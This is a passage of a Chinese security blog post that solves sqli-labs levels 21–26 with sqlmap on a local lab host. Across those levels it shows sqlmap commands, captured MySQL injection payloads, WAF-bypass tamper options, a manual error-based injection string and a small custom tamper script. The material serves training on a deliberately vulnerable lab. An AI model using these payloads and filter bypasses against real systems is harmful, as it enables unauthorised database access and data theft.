+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uname=admin<span class="hljs-string">&#x27; AND (SELECT 4501 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(SELECT (ELT(4501=4501,1))),0x716b767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;</span>AXTs<span class="hljs-string">&#x27;=&#x27;</span>AXTs
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=admin<span class="hljs-string">&#x27; AND (SELECT 4107 FROM (SELECT(SLEEP(5)))MHaz) AND &#x27;</span>sLBD<span class="hljs-string">&#x27;=&#x27;</span>sLBD
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: uname=-2840<span class="hljs-string">&#x27; UNION ALL SELECT CONCAT(0x7178787071,0x4d466f624d544e746e5669714a4e5a4b76686e6c7042487153507763574256777855626f58717868,0x716b767671),NULL,NULL-- AKIY</span>
+<span class="hljs-string">---</span>
+<span class="hljs-string"></span></code></pre></div>
+
+
+
+<h1 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h1><p>这一关对cookie中的uname字段进行了base64编码</p>
+<p>可以使用sqlmap  –list-tampers 查看所有tampers，和base64编码相关的是base64encode.py</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">* apostrophemask.py - Replaces apostrophe character (<span class="hljs-string">&#x27;) with its UTF-8 full width counterpart (e.g. &#x27;</span> -&gt; %EF%BC%87)
+* apostrophenullencode.py - Replaces apostrophe character (<span class="hljs-string">&#x27;) with its illegal double unicode counterpart (e.g. &#x27;</span> -&gt; %00%27)
+* appendnullbyte.py - Appends (Access) NULL byte character (%00) at the end of payload
+* base64encode.py - Base64-encodes all characters <span class="hljs-keyword">in</span> a given payload
+* between.py - Replaces greater than operator (<span class="hljs-string">&#x27;&gt;&#x27;</span>) with <span class="hljs-string">&#x27;NOT BETWEEN 0 AND #&#x27;</span> and equals operator (<span class="hljs-string">&#x27;=&#x27;</span>) with <span class="hljs-string">&#x27;BETWEEN # AND #&#x27;</span>
+* bluecoat.py - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character <span class="hljs-string">&#x27;=&#x27;</span> with operator LIKE
+* chardoubleencode.py - Double URL-encodes all characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; %2553%2545%254C%2545%2543%2554)
+* charencode.py - URL-encodes all characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54)
+* charunicodeencode.py - Unicode-URL-encodes all characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054)
+* charunicodeescape.py - Unicode-escapes non-encoded characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054)
+* commalesslimit.py - Replaces (MySQL) instances like <span class="hljs-string">&#x27;LIMIT M, N&#x27;</span> with <span class="hljs-string">&#x27;LIMIT N OFFSET M&#x27;</span> counterpart
+* commalessmid.py - Replaces (MySQL) instances like <span class="hljs-string">&#x27;MID(A, B, C)&#x27;</span> with <span class="hljs-string">&#x27;MID(A FROM B FOR C)&#x27;</span> counterpart
+* commentbeforeparentheses.py - Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/()
+* concat2concatws.py - Replaces (MySQL) instances like <span class="hljs-string">&#x27;CONCAT(A, B)&#x27;</span> with <span class="hljs-string">&#x27;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#x27;</span> counterpart
+* equaltolike.py - Replaces all occurrences of operator equal (<span class="hljs-string">&#x27;=&#x27;</span>) with <span class="hljs-string">&#x27;LIKE&#x27;</span> counterpart
+* escapequotes.py - Slash escape single and double quotes (e.g. <span class="hljs-string">&#x27; -&gt; \&#x27;</span>)
+* greatest.py - Replaces greater than operator (<span class="hljs-string">&#x27;&gt;&#x27;</span>) with <span class="hljs-string">&#x27;GREATEST&#x27;</span> counterpart
+* halfversionedmorekeywords.py - Adds (MySQL) versioned comment before each keyword
+* hex2char.py - Replaces each (MySQL) 0x&lt;hex&gt; encoded string with equivalent CONCAT(CHAR(),...) counterpart
+* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. <span class="hljs-string">&#x27; -&gt; &amp;#39;)</span>
+<span class="hljs-string">* ifnull2casewhenisnull.py - Replaces instances like &#x27;</span>IFNULL(A, B)<span class="hljs-string">&#x27; with &#x27;</span>CASE WHEN ISNULL(A) THEN (B) ELSE (A) END<span class="hljs-string">&#x27; counterpart</span>
+<span class="hljs-string">* ifnull2ifisnull.py - Replaces instances like &#x27;</span>IFNULL(A, B)<span class="hljs-string">&#x27; with &#x27;</span>IF(ISNULL(A), B, A)<span class="hljs-string">&#x27; counterpart</span>
+<span class="hljs-string">* informationschemacomment.py - Add an inline comment (/**/) to the end of all occurrences of (MySQL) &quot;information_schema&quot; identifier</span>
+<span class="hljs-string">* least.py - Replaces greater than operator (&#x27;</span>&gt;<span class="hljs-string">&#x27;) with &#x27;</span>LEAST<span class="hljs-string">&#x27; counterpart</span>
+<span class="hljs-string">* lowercase.py - Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)</span>
+<span class="hljs-string">* luanginx.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare)</span>
+<span class="hljs-string">* modsecurityversioned.py - Embraces complete query with (MySQL) versioned comment</span>
+<span class="hljs-string">* modsecurityzeroversioned.py - Embraces complete query with (MySQL) zero-versioned comment</span>
+<span class="hljs-string">* multiplespaces.py - Adds multiple spaces (&#x27;</span> <span class="hljs-string">&#x27;) around SQL keywords</span>
+<span class="hljs-string">* overlongutf8.py - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. &#x27;</span> -&gt; %C0%A7)
+* overlongutf8more.py - Converts all characters <span class="hljs-keyword">in</span> a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
+* percentage.py - Adds a percentage sign (<span class="hljs-string">&#x27;%&#x27;</span>) infront of each character (e.g. SELECT -&gt; %S%E%L%E%C%T)
+* plus2concat.py - Replaces plus operator (<span class="hljs-string">&#x27;+&#x27;</span>) with (MsSQL) <span class="hljs-keyword">function</span> CONCAT() counterpart
+* plus2fnconcat.py - Replaces plus operator (<span class="hljs-string">&#x27;+&#x27;</span>) with (MsSQL) ODBC <span class="hljs-keyword">function</span> &#123;fn CONCAT()&#125; counterpart
+* randomcase.py - Replaces each keyword character with random <span class="hljs-keyword">case</span> value (e.g. SELECT -&gt; SEleCt)
+* randomcomments.py - Add random inline comments inside SQL keywords (e.g. SELECT -&gt; S/**/E/**/LECT)
+* sp_password.py - Appends (MsSQL) <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;sp_password&#x27;</span> to the end of the payload <span class="hljs-keyword">for</span> automatic obfuscation from DBMS logs
+* space2comment.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with comments <span class="hljs-string">&#x27;/**/&#x27;</span>
+* space2dash.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a dash comment (<span class="hljs-string">&#x27;--&#x27;</span>) followed by a random string and a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)
+* space2hash.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with a pound character (<span class="hljs-string">&#x27;#&#x27;</span>) followed by a random string and a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)
+* space2morecomment.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with comments <span class="hljs-string">&#x27;/**_**/&#x27;</span>
+* space2morehash.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with a pound character (<span class="hljs-string">&#x27;#&#x27;</span>) followed by a random string and a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)
+* space2mssqlblank.py - Replaces (MsSQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with a random blank character from a valid <span class="hljs-built_in">set</span> of alternate characters
+* space2mssqlhash.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a pound character (<span class="hljs-string">&#x27;#&#x27;</span>) followed by a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)
+* space2mysqlblank.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with a random blank character from a valid <span class="hljs-built_in">set</span> of alternate characters
+* space2mysqldash.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a dash comment (<span class="hljs-string">&#x27;--&#x27;</span>) followed by a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)
+* space2plus.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with plus (<span class="hljs-string">&#x27;+&#x27;</span>)
+* space2randomblank.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a random blank character from a valid <span class="hljs-built_in">set</span> of alternate characters
+* substring2leftright.py - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
+* symboliclogical.py - Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||)
+* unionalltounion.py - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
+* unmagicquotes.py - Replaces quote character (<span class="hljs-string">&#x27;) with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)</span>
+<span class="hljs-string">* uppercase.py - Replaces each keyword character with upper case value (e.g. select -&gt; SELECT)</span>
+<span class="hljs-string">* varnish.py - Appends a HTTP header &#x27;</span>X-originating-IP<span class="hljs-string">&#x27; to bypass Varnish Firewall</span>
+<span class="hljs-string">* versionedkeywords.py - Encloses each non-function keyword with (MySQL) versioned comment</span>
+<span class="hljs-string">* versionedmorekeywords.py - Encloses each keyword with (MySQL) versioned comment</span>
+<span class="hljs-string">* xforwardedfor.py - Append a fake HTTP header &#x27;</span>X-Forwarded-For<span class="hljs-string">&#x27; (and alike)</span>
+<span class="hljs-string">[07:50:31] [WARNING] you haven&#x27;</span>t updated sqlmap <span class="hljs-keyword">for</span> more than 136 days!!!</code></pre></div>
+
+
+
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-21/index.php --cookie=<span class="hljs-string">&quot;uname=admin&quot;</span> --dbs --thread 10 --level 2  --tamper <span class="hljs-string">&quot;base64encode.py&quot;</span> --batch</code></pre></div>
+
+
+
+
+
+<p>报错注入、时间盲注、bool盲注</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">Cookie parameter <span class="hljs-string">&#x27;uname&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:
+---
+Parameter: uname (Cookie)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: uname=admin<span class="hljs-string">&#x27;) AND 5369=5369 AND (&#x27;</span>iQxR<span class="hljs-string">&#x27; LIKE &#x27;</span>iQxR
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uname=admin<span class="hljs-string">&#x27;) AND (SELECT 7756 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(SELECT (ELT(7756=7756,1))),0x71717a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (&#x27;</span>XAYM<span class="hljs-string">&#x27; LIKE &#x27;</span>XAYM
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=admin<span class="hljs-string">&#x27;) AND (SELECT 4840 FROM (SELECT(SLEEP(5)))xHLI) AND (&#x27;</span>NCtt<span class="hljs-string">&#x27; LIKE &#x27;</span>NCtt
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 3 columns
+    Payload: uname=-1690<span class="hljs-string">&#x27;) UNION ALL SELECT 7354,7354,CONCAT(0x71626b7071,0x436d455544674777774e596b4d736d666d41514e784369594447524264716e6f6b4f444e52657454,0x71717a7871)#</span>
+<span class="hljs-string">---</span>
+<span class="hljs-string"></span></code></pre></div>
+
+
+
+<h1 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h1><p>与上一关没有太大区别，payload一致</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:
+---
+Parameter: uname (Cookie)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: uname=admin<span class="hljs-string">&quot; AND 2420=2420 AND &quot;</span>oiis<span class="hljs-string">&quot;=&quot;</span>oiis
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uname=admin<span class="hljs-string">&quot; AND (SELECT 3162 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3162=3162,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &quot;</span>KDER<span class="hljs-string">&quot;=&quot;</span>KDER
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=admin<span class="hljs-string">&quot; AND (SELECT 3871 FROM (SELECT(SLEEP(5)))FnVE) AND &quot;</span>GAqW<span class="hljs-string">&quot;=&quot;</span>GAqW
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 3 columns
+    Payload: uname=-9694<span class="hljs-string">&quot; UNION ALL SELECT CONCAT(0x7176766a71,0x534b4a6c6748675549714b5253726363584546487753484c4a6a584c7745506b736d5461417a5072,0x7171787871),2413,2413#</span>
+<span class="hljs-string">---</span>
+<span class="hljs-string"></span></code></pre></div>
+
+
+
+<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>从less23开始加入一些过滤，这里可以使用内置tamper或者自己编写的tamper进行绕过，这一关只是过滤了注释符，闭合是可以的</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-23/index.php?id=1  --dbs --thread 10 --batch</code></pre></div>
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1<span class="hljs-string">&#x27; AND 4202=4202 AND &#x27;</span>oxkU<span class="hljs-string">&#x27;=&#x27;</span>oxkU
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 1312 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(1312=1312,1))),0x7170627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;</span>CjmC<span class="hljs-string">&#x27;=&#x27;</span>CjmC
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 6430 FROM (SELECT(SLEEP(5)))EFyw) AND &#x27;</span>hGlI<span class="hljs-string">&#x27;=&#x27;</span>hGlI
+---</code></pre></div>
+
+
+
+
+
+<h1 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h1><p>24关为二次注入绕过登录限制。这里暂时不用sqlmap了</p>
+<p>关于sqlmap和自定义tamper利用二次注入的大神文章也有：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/142963.html">使用Burp和自定义Sqlmap Tamper利用二次注入漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3010">记一份SQLmap使用手册小结（一）</a></li>
+</ul>
+<p>或者使用sqlmap 的二次注入功能</p>
+<p>参数：<code>–second-order</code></p>
+<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p>
+<p><code>–second-order</code>后面跟一个判断页面的URL地址。</p>
+<h1 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h1><p>这一关主要是绕过or 和 and 过滤，替换方法有如下：</p>
+<ul>
+<li>（1）大小写变形 Or,OR,oR </li>
+<li>（2）编码，hex，urlencode </li>
+<li>（3）添加注释/<em>or</em>/ </li>
+<li>（4）利用符号 and=&amp;&amp; or=||</li>
+</ul>
+<p>sqlmap 对于or和and 替换成 &amp;&amp; 与 || 有内置tamper symboliclogical.py</p>
+<p>没有加tamper时，显示无法注入</p>
+<p>加上之后，可以成功，但是并没有返回所有数据库，显示在查询数据库数量的时候出现错误</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-25/index.php?id=1  --dbs --thread 10 --batch --tamper <span class="hljs-string">&quot;symboliclogical.py&quot;</span></code></pre></div>
+
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1<span class="hljs-string">&#x27; AND 2505=2505 AND &#x27;</span>XqwA<span class="hljs-string">&#x27;=&#x27;</span>XqwA
+
+    Type: error-based
+    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1<span class="hljs-string">&#x27; AND EXTRACTVALUE(2208,CONCAT(0x5c,0x7176787671,(SELECT (ELT(2208=2208,1))),0x716b627671)) AND &#x27;</span>TFVC<span class="hljs-string">&#x27;=&#x27;</span>TFVC
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 3398 FROM (SELECT(SLEEP(5)))PPqA) AND &#x27;</span>xghV<span class="hljs-string">&#x27;=&#x27;</span>xghV
+---
+</code></pre></div>
+
+
+
+
+
+<h1 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h1><p>payload与上一关一致，但是也无法获取数据库数量：[08:50:10] [ERROR] unable to retrieve the number of databases</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-25a/index.php?id=1  --dbs --thread 5 --batch --tamper <span class="hljs-string">&quot;symboliclogical.py&quot;</span> -D <span class="hljs-string">&quot;security&quot;</span> --tables</code></pre></div>
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6237=6237
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 6319 FROM (SELECT(SLEEP(5)))wIaO)
+---
+</code></pre></div>
+
+
+
+
+
+<h1 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h1><p>这一关主要考察过滤空格的绕过，有些特殊字符在windows下apache无法解析。</p>
+<ul>
+<li>%09 TAB 键（水平） </li>
+<li>%0a 新建一行 </li>
+<li>%0c 新的一页 </li>
+<li>%0d return 功能 </li>
+<li>%0b TAB 键（垂直） </li>
+<li>%a0 空格</li>
+<li>/**/</li>
+<li>()</li>
+</ul>
+<p>这一关结合了25，将空格，or，and,/*,#,–,/等各种符号过滤</p>
+<p>直接跑无法成功，加上tamper  space2comment.py 可以把’ ‘ 编程 ‘/**/‘ ，也可以使用space2mysqlblank.py，但是后者无法检测出漏洞。此处为我的环境原因，可能无法解析如上的一些特殊字符</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --current-db --thread 5 --tamper <span class="hljs-string">&quot;space2comment.py;symboliclogical.py&quot;</span> --batch --technique E -v 3</code></pre></div>
+
+
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 1562 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1<span class="hljs-string">&#x27; AND EXTRACTVALUE(5063,CONCAT(0x5c,0x716b7a7671,(SELECT (ELT(5063=5063,1))),0x71767a6a71)) AND &#x27;</span>PxYC<span class="hljs-string">&#x27;=&#x27;</span>PxYC
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)
+    Payload: id=1<span class="hljs-string">&#x27; AND SLEEP(5) AND &#x27;</span>mExo<span class="hljs-string">&#x27;=&#x27;</span>mExo
+---</code></pre></div>
+
+
+
+<p>尽管获得了注入点和方式，但是却无法获取到数据库，估计与tamper的处理有所关系。</p>
+<p>使用 -v 3 参数获取发送的payload</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">1<span class="hljs-string">&#x27;/**/%26%26/**/EXTRACTVALUE(9494,CONCAT(0x5c,0x716b7a7671,(SELECT/**/REPEAT(0x38,8)),0x71767a6a71))/**/%26%26/**/&#x27;</span>DeJl<span class="hljs-string">&#x27;=&#x27;</span>DeJl</code></pre></div>
+
+
+
+<p>可以看出sqlmap在处理空格替换的时候没有处理好最后一个单引号，连接起来后可能因为mysql版本问题或者是字符解析问题，有些字符无法奏效。看来上面成功检测漏洞实际上是假象，使用上面的payload并不能奏效。</p>
+<p>尝试自己写tamper，将其修改</p>
+<p>先手工测试一下报错注入：</p>
+<p><code>id=2&#39;&lt;&gt;(select(updatexml(1,concat(0x2b,version(),0x2b),1)))&lt;&gt;&#39;1</code></p>
+<p>接下来就是在sqlmap中添加前后缀，</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --dbs --thread 5 --tamper <span class="hljs-string">&quot;symboliclogical.py;space2comment.py&quot;</span> --prefix <span class="hljs-string">&quot;2&#x27;&lt;&gt;(&quot;</span> --suffix <span class="hljs-string">&quot;)&lt;&gt;&#x27;1&quot;</span>  --batch -v 3 --technique E</code></pre></div>
+
+<p>但是无法奏效，查阅资料后发现是/**/只对特定的mysql版本有效（难怪报错的时候给我报个连着的select和version）</p>
+<p>查看了一下sqlmap对updatexml的支持：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">2<span class="hljs-string">&#x27;&lt;&gt;((UPDATEXML(1474,CONCAT(0x2e,0x7176786a71,(SELECT/**/REPEAT(0x34,64)),0x7170767171),5807)))&lt;&gt;&#x27;</span>1</code></pre></div>
+
+<p>中间换成(SELECT(REPEAT(0x34,64)))就可以成功回显了。</p>
+<p>这个时候使用sqlmap其实作用已经不大了，毕竟工具是死的，手工编写一些脚本可能更加有效。</p>
+<p>想要修改的话可以修改源码，参考上面的sqlmap自定义去添加自定义payload比较好</p>
+<p>由于空格过滤后别的字符又无法解析，所以这里将空格过滤注释掉后可以成功注入</p>
+<h1 id="less26-1"><a href="#less26-1" class="headerlink" title="less26"></a>less26</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-26a/index.php?id=1  --dbs --thread 5 --tamper <span class="hljs-string">&quot;symboliclogical.py&quot;</span> --prefix <span class="hljs-string">&quot;&#x27;)&lt;&gt;(&quot;</span> --suffix <span class="hljs-string">&quot;)&lt;&gt;(&#x27;1&quot;</span>  --batch -v 3  --tables -D <span class="hljs-string">&quot;security&quot;</span> --level 3</code></pre></div>
+
+
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace
+    Payload: id=<span class="hljs-string">&#x27;)&lt;&gt;((CASE WHEN (1221=1221) THEN SLEEP(5) ELSE 1221 END))&lt;&gt;(&#x27;</span>1
+    Vector: (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)
+---
+</code></pre></div>
+
+<p>能够成功检测出注入，但是ord因为有or所以被过滤掉了</p>
+<p>如果将ord换成ascii即可绕过</p>
+<p>编写tamper</p>
+<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY
+__priority__ = PRIORITY.LOW
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):</span>
+    <span class="hljs-keyword">if</span> payload:
+        bypass_str = <span class="hljs-string">&quot;ascii&quot;</span>
+        payload=payload.replace(<span class="hljs-string">&quot;ORD&quot;</span>,bypass_str)
+    <span class="hljs-keyword">return</span> payload</code></pre></div>
+
+
+
+
+
+<h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/sqlmap/">sqlmap</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/mysql/">mysql</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sqlmap/">sqlmap</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/09/20/jwt-%E5%AE%89%E5%85%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">jwt 安全</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/25/%E3%80%90CISCN-2020%E5%88%9D%E8%B5%9B%E3%80%91writeup-web%E9%83%A8%E5%88%86/">
+                        <span class="hidden-mobile">【CISCN 2020初赛】writeup web部分</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https://greydr34d.github.io/2020/09/10/sqlmap-%E8%A7%A3%E5%86%B3sqli-labs/';
+        this.page.identifier = '/2020/09/10/sqlmap-%E8%A7%A3%E5%86%B3sqli-labs/';
+      };
+      Fluid.utils.waitElementVisible('disqus_thread', function () {
+        var d = document, s = d.createElement('script');
+        s.src = '//' + '' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
